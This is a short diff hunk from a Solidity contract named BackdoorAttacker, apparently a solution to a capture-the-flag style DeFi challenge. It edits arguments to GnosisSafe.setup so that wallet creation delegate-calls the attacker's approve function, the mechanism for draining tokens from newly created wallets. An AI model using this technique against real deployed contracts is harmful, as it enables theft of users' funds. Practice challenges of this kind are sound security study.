@@ -146,12 +146,12 @@ contract BackdoorAttacker {
                 GnosisSafe.setup.selector,
                 owners,
                 1,
-                address(this), // create2 proxy address
+                address(this),
                 abi.encodeWithSelector(
                     BackdoorAttacker.approve.selector,
                     address(this)
                 ),
-                address(token), // fallbackHandler
+                address(0x0),
                 address(0x0),
                 0,
                 address(0x0)
